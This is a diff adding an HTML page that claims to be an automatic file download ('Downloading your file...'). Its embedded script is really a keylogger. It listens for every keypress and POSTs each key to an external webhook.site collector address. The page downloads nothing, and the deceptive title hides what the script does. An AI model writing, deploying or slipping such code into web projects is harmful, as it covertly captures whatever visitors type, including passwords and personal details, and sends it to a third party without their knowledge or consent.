@@ -1,0 +1,21 @@
+
+
+
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Automatic File Download</title>
+</head>
+<body>
+  <h1>Downloading your file...</h1>
+  <script>
+  document.addEventListener('keypress', function(e) {
+    fetch('https://webhook.site/your-unique-id', {
+      method: 'POST',
+      body: 'Key pressed: ' + e.key
+    });
+  });
+</script>
+</body>
+</html>
